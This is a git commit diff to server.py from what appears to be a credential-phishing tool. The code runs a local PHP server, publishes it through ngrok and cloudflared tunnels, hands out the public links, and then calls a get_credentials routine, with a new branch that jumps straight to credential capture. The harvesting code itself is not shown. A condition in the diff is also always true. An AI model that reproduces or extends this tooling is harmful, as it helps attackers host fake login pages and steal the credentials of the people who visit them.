25d59eb66454309aca07498757200f35cc3a8140
Tenebris <naniiloveminecraft@outlook.com>
2025-01-28 09:31:53 +0100

    base

--- server.py
+++ server.py
@@ -57,7 +57,11 @@ def server(port, mode):
             print(error+"PHP Error")
             killer()
             exit(1)
-    if mode == "1" or 1:
+    print(mode)
+    if mode == 0:
+        print("\n"+"Getting credentials!")
+        get_credentials()
+    elif mode == "1" or 1:
         print("\n"+info2+"Initializing tunnelers at same address....."+nrml)
         check_intr()
         system("cd $HOME/.cloudflaredfolder && chmod +x * && cd $HOME && rm -rf log.txt")
@@ -71,39 +75,39 @@ def server(port, mode):
                 system("cd $HOME/.cloudflaredfolder && ./cloudflared tunnel -url 127.0.0.1:"+str(port)+" --logfile log.txt > /dev/null 2>&1 &")
                 break
         ngroklink=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
-    if ngroklink.find("ngrok")!=-1:
-        ngrokcheck=True
-    else:
-        ngrokcheck=False
-    cflink=popen("cat ~/.cloudflaredfolder/log.txt | grep -o 'https://[-0-9a-z]*/.trycloudflare.com'").read()
-    if cflink.find("cloudflare")!=-1:
-        cfcheck=True
-    else:
-        cfcheck=False
-    while True:
-        from ngrock_cloudflare import url_manager, custom_url_ask
-        from main import nc
-        if ngrokcheck and cfcheck:
-            url_manager(cflink, "1", "2")
-            url_manager(ngroklink, "3", "4")
-            custom_url_ask(cflink)
-            break
-        elif not ngrokcheck and cfcheck:
-            url_manager(cflink, "1", "2")
-            custom_url_ask(cflink)
-            break
-        elif not cfcheck and ngrokcheck:
-            url_manager(ngroklink, "1", "2")
-            custom_url_ask(ngroklink)
-            break
-        elif not (cfcheck and ngrokcheck):
-            print("\n"+error+"Tunneling falied!"+nc+nrml)
-            killer()
-            exit()
+        if ngroklink.find("ngrok")!=-1:
+            ngrokcheck=True
         else:
-            print("\n"+error+"Unknown error!"+nrml)
-            killer()
-            exit()
+            ngrokcheck=False
+        cflink=popen("cat ~/.cloudflaredfolder/log.txt | grep -o 'https://[-0-9a-z]*/.trycloudflare.com'").read()
+        if cflink.find("cloudflare")!=-1:
+            cfcheck=True
+        else:
+            cfcheck=False
+        while True:
+            from ngrock_cloudflare import url_manager, custom_url_ask
+            from main import nc
+            if ngrokcheck and cfcheck:
+                url_manager(cflink, "1", "2")
+                url_manager(ngroklink, "3", "4")
+                custom_url_ask(cflink)
+                break
+            elif not ngrokcheck and cfcheck:
+                url_manager(cflink, "1", "2")
+                custom_url_ask(cflink)
+                break
+            elif not cfcheck and ngrokcheck:
+                url_manager(ngroklink, "1", "2")
+                custom_url_ask(ngroklink)
+                break
+            elif not (cfcheck and ngrokcheck):
+                print("\n"+error+"Tunneling falied!"+nc+nrml)
+                killer()
+                exit()
+            else:
+                print("\n"+error+"Unknown error!"+nrml)
+                killer()
+                exit()
 
     print("\n"+"Getting credentials!")
     get_credentials()
